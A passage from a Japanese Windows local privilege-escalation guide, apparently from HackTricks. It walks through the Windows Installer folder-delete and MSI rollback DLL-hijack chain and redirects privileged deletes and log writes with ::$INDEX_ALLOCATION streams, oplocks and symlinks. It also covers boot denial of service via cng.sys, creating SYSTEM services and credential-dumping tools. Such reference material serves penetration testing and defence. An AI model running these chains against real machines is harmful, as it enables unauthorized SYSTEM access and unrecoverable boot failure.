`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元が指定した filter 引数にかかわらず、そのパスをフォルダーとしてスケジュールします。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)` が直接クリーンアップを開始します。昇格された権限で動作する worker はレジストリ値を列挙し、フォルダー項目をパスの出所を確認せずに再帰的な `FDeleteFolder` に渡します。通常の削除に失敗した場合、コードはさらに `LockdownPath` を呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から復元された最小の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を保護された rollback データとともに再作成させます。Cleanup は古い `TempPackages` 名を信頼して、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図する境界を回避します。<sup>[[41]](#references)</sup>

この削除 primitive は、以下の rollback chain に適用できます。別個の `Installer\Folders` レコードは保持したまま、保護された `C:\Config.Msi` を削除し、NULL DACL で再作成して、installer が DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle から `NtSetSecurityObject` で permissive な DACL を復元でき、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、このパスを修正しました。COM call は成功を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。method の戻り値が成功したかどうかで patch の適用を判断せず、2025年4月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にしておく）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **非管理者ユーザー**が実行できるように、installer を **"UAC Compliant"** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall プロセスはファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - `GetFinalPathNameByHandle` で開いたファイル handle を **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: 独自の同期処理
    - `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event が通知されるまで待機し、uninstall の続行を保留します。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを **開きます**。これにより **ファイルの削除を防止**します。
    - その後、uninstall が完了できるよう応答を通知します。
    - Windows Installer は `.rbf` の削除に失敗します。すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり**、Hijack の準備が整います。

> この時点で、**SYSTEM レベルの任意フォルダー削除 vulnerability を発動**し、`C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback script を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を開いたままにします。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を引き起こす変数。
    - この install で **rollback** を再び発動させ、`.rbs` と `.rbf` を読み込ませます。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - ファイル名を記録します。

- Step 9: Rollback 前に同期する
    - `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行前に待機します。

- Step 10: 弱い ACL を再設定する
    - `.rbs created` event を受け取ると、次のことが起こります。
        - Windows Installer が `C:\Config.Msi` に強い ACL を再設定します。
        - ただし、`WRITE_DAC` を持つ handle をまだ保持しているため、再び **弱い ACL を設定**できます。

> ACL は **handle を開くときにのみ適用**されるため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の操作を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を、特権が必要な場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **SYSTEM レベルの悪意ある payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動する
    - 同期 event を通知し、installer を再開させます。
    - **type 19 custom action (`ErrorOut`)** は、決まった時点で install を **意図的に失敗**させるよう設定されています。
    - これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込みます。
        - `.rbf` DLL を対象の場所にコピーします。
    - これで **SYSTEM が読み込むパスに悪意ある DLL** が配置されます。

- 最終ステップ: SYSTEM code を実行する
    - Hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで code が SYSTEM として実行されます。**


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主要な MSI rollback technique（前述の手法）は、`C:\Config.Msi` などの **フォルダー全体を削除**できることを前提としています。しかし、vulnerability で可能なのが **任意のファイル削除**だけだとしたら、どうすればよいでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの`::$INDEX_ALLOCATION`ストリームを**削除**すると、NTFSはファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除APIを使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除することはできなくても、攻撃者が制御するフォルダーの**内容を削除できる** primitive があるとしたら、どうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって実行が**一時停止**されます。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. ステップ 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. ステップ 4: oplock コールバック内 — 削除先をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` 内に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを保存する NTFS の内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink によって、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的なDoSへ

**SYSTEM/admin として任意のフォルダーを作成できる**プリミティブを悪用します。**ファイルを書き込めない**場合や、**弱いアクセス許可を設定できない**場合でも可能です。

**重要な Windows ドライバー**の名前を使って、ファイルではなく**フォルダー**を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーが存在するため、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から介入（ブート修復やディスクへのアクセスなど）しない限り、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks から任意ファイルの上書き／ブート DoS へ

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログやエクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、（SeCreateSymbolicLinkPrivilege がなくても）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先のパスを保存した設定ファイルを攻撃者が書き換えられること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み、特権ログの保存先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テスト SMS を送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を調べ（hex/PE parser）、破損を確認します。再起動すると Windows が改ざんされたドライバーのパスを読み込むため、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試される可能性があるため、破損データによる信頼性の高い DoS の標的になります。



## **High Integrity から System へ**

### **新しいサービス**

すでに High Integrity プロセスで実行中の場合、**新しいサービスを作成して実行するだけで**、**SYSTEM への昇格**は簡単です:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒後に強制終了されます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedレジストリエントリを有効化**し、_**.msi**_ラッパーを使ってreverse shellを**インストール**できます。\
関連するレジストリキーと_.msi_パッケージのインストール方法については、[こちらをご覧ください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

[**コードはこちら**](seimpersonate-from-high-to-system.md)**で確認できます。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegeがあれば（おそらく、すでにHigh Integrityで実行されているプロセスで見つかります）、SeDebug privilegeを使って（保護されたプロセスを除く）**ほぼすべてのプロセスを開き**、そのプロセスのtokenを**コピー**して、そのtokenを使って**任意のプロセスを作成**できます。\
この手法では通常、**すべてのtoken privilegeを持つSYSTEMプロセスを選択します**（_すべてのtoken privilegeを持たないSYSTEMプロセスも見つかります_）。\
**提案した手法を実行するコードの**[**例はこちら**](sedebug-+-seimpersonate-copy-token.md)**で確認できます。**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で権限昇格するときに使用します。手順は、**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**というものです。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegeを取得できます。\
[**name pipeについて詳しく知りたい場合はこちらをご覧ください。**](#named-pipe-client-impersonation)\
[**name pipeを使ってHigh IntegrityからSystemに移行する例はこちらをご覧ください。**](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEMとして実行されている**プロセスによって**ロード**されるdllを**乗っ取る**ことができれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種の権限昇格にも有効です。さらに、High Integrityプロセスからはdllのロードに使われるフォルダーへの**書き込み権限**があるため、ずっと**簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちらをご覧ください**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windowsのローカル権限昇格ベクトルを調べる最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスと機密ファイルを確認 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 考えられる設定ミスを確認し、情報を収集 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスを確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルで実行する際は-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体に対してsprayします。**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNSスプーフィングおよび中間者攻撃ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioを使ってコンパイルする必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストを列挙します（privescというより情報収集ツールです）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスを確認します（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられる設定ミスを確認します（Python製のexe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を基に作成されたツールです（正常に動作するためにaccesschkは必要ありませんが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを提示します（ローカルで実行するPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを提示します（ローカルで実行するPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの.NETを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 攻撃: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP 完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester 向け Windows 権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA マクロフィッシング → hMailServer の認証情報を復号 → Veeam CVE-2023-27532 で SYSTEM 権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: フォーマット文字列リーク + スタック BOF → VirtualAlloc ROP (RCE) とカーネルトークン窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: カーネルの影で繰り広げられる追跡劇](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA システムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [シンボリックリンクテストツール – CreateSymlink の使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windows のシンボリックリンクを悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF 移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js の信頼の落とし穴: Windows における危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js モジュール: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop の Pwn2Own: CLDFLT と DirectX カーネルの競合状態を連鎖させた Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する 1 つの I/O Ring: Windows 11 における完全な読み書きエクスプロイトプリミティブ](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs のエクスプロイトコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 攻撃 パート 2: CVE-2020-1013、Windows 10 のローカル権限昇格 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault を調べる](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos のリソースベース制約付き委任: イメージの変更が権限昇格につながるケース](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 SSH Agent から SSH 秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – パート 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – パート 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer フォルダーの削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM への足跡をたどり直す](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services の共有メモリオフセットに関する権限昇格アドバイザリ](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
